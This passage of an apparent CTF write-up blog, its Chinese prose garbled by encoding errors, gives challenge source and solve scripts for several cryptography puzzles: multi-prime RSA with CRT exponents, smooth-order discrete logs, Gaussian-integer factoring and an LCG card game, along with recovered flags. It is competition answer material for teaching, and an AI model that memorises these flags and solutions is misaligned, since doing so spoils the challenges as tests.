</span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®çš„æ„æ€æ˜¯ç”Ÿæˆäº†ä¸€ä¸ª127æ¬¡å¤šé¡¹å¼ æˆ‘ä»¬å¯ä»¥ç»™ä¸€ä¸ª<code>&lt;=2^32</code>çš„æ•°ä½œä¸ºx<br>èƒ½çŸ¥é“f(x)çš„å€¼ åæ¨æ‰€æœ‰ç³»æ•°</p>
<p>å…¶å®é¢˜ç›®é‚£ä¸ªcheckå¤§å°çš„é™åˆ¶å·²ç»å¾ˆæ˜ç¡®çš„æç¤ºæ€è·¯äº† æˆ‘ä»¬é€‰æ‹©-2^32ä¹Ÿå¯ä»¥è¿˜åŸ<br>ä»æœ€é«˜ä½å¼€å§‹ é™¤ä»¥å¯¹åº”å¹‚æ¬¡åç»å¯¹å€¼å‘ä¸Šå–æ•´å³å¯è¿˜åŸ</p>
<h2 id="Fi1nd-th3-xâ€™"><a href="#Fi1nd-th3-xâ€™" class="headerlink" title="Fi1nd_th3_xâ€™"></a>Fi1nd_th3_xâ€™</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>emmm æ€ä¹ˆè¯´å‘¢ æˆ‘å°±éšä¾¿è¯•äº†è¯• (æƒ³åˆ°flagä¸ç»è¿‡paddingè¿˜æ˜¯æŒºå°çš„)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,dP,q*r)))</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±å‡ºäº†â€¦<br><code>SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;</code></p>
<p>å›åˆ°é¢˜ç›®æœ¬èº«çš„è€ƒç‚¹: ä¸äº’ç´ æƒ…å†µä¸‹çš„CRT<br>dP,dQ,dR åˆ†åˆ«å¯ä»¥å¾—åˆ°</p>
<p><img src="https://s2.loli.net/2023/12/03/dTgqRexIQvDsPkJ.png" alt="H~7~A___X_G80H_J7CW_K1L.png"></p>
<p><code>from sympy.ntheory.modular import crt</code> è¿™ä¸ªcrtå¯ä»¥è§£å†³ä¸äº’ç´ çš„æƒ…å†µ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([q*r,p*r,p*q],[<span class="built_in">pow</span>(c,dP,n),<span class="built_in">pow</span>(c,dQ,n),<span class="built_in">pow</span>(c,dR,n)])[<span class="number">0</span>]%n))</span><br></pre></td></tr></table></figure>

<h2 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç”±é¢˜ç›®p,q,rçš„ç”Ÿæˆæ–¹å¼çŸ¥: p-1,q-1,r-1å‡å…‰æ»‘<br>æ³¨æ„åˆ°p,q,rå‡ä¸ºç´ æ•° é‚£ä¹ˆæˆ‘ä»¬åˆ†åˆ«å¯¹mod p,q,ræ±‚dlpåcrtç»„åˆèµ·æ¥å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="number">3</span></span><br><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line">n = p*q*r</span><br><span class="line"></span><br><span class="line">mp = discrete_log(mod(y,p),mod(g,p))</span><br><span class="line">mq = discrete_log(mod(y,q),mod(g,q))</span><br><span class="line">mr = discrete_log(mod(y,r),mod(g,r))</span><br><span class="line"><span class="built_in">print</span>(CRT_list([mp,mq,mr],[p,q,r]))</span><br><span class="line">m = <span class="number">10611516989504525712597368786937786671609696614143113241754963687897074368833799765059908989</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>azâ€¦ å­¦åˆ°äº† (<a href="/2023/12/03/Complex-RSA/" title="Complex RSA">Complex-RSA</a>)<br>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>åœ¨å¤æ•°åŸŸä¸Šåˆ†è§£N éå†å…¶å› å­å°±èƒ½å¾—åˆ°p,q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,e</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> e])</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">32</span></span><br><span class="line">flag = pad(flag,<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LongArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [bytes_to_long(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BytesArray</span>(<span class="params">t:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [long_to_bytes(t[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a[i%<span class="built_in">len</span>(a)] ^^ b[i%<span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ArrayXor</span>(<span class="params">a:<span class="built_in">list</span>,b:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [xor(a[i],b) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scissors</span>(<span class="params">flag:<span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="built_in">len</span>(flag)//<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">m: <span class="built_in">bytes</span>, bits: <span class="built_in">int</span>, level: <span class="built_in">int</span></span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    M = random_matrix(Zmod(p), LEN).matrix_from_rows_and_columns(<span class="built_in">range</span>(LEN), <span class="built_in">range</span>(LEN-level))</span><br><span class="line">    c = vector(GF(p), m) * M</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;p&quot;</span>: p, <span class="string">&quot;M&quot;</span>: M.<span class="built_in">list</span>(), <span class="string">&quot;c&quot;</span>: c.<span class="built_in">list</span>()&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">groebner_challenge</span>(<span class="params">m,e</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    s = <span class="built_in">sum</span>(m)</span><br><span class="line">    c = [<span class="built_in">pow</span>(m[i],e[i],p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    c.insert(<span class="number">0</span>,s)</span><br><span class="line">    c.insert(<span class="number">0</span>,p)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">key = os.urandom(LEN)</span><br><span class="line">Get_key = challenge(key,<span class="number">256</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">S_bytes = scissors(flag)</span><br><span class="line">C_bytes = ArrayXor(S_bytes,key)</span><br><span class="line">C_long  = LongArray(C_bytes)</span><br><span class="line"></span><br><span class="line">groebner_challenge = groebner_challenge(C_long,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keyTask.chall&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;Get_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;groebnerTask.chall&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;groebner_challenge&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å…ˆå­¦ä¹ ä¸‹groeberåŸºå†å›æ¥è¡¥</p>
<h2 id="CardGame"><a href="#CardGame" class="headerlink" title="CardGame"></a>CardGame</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure>
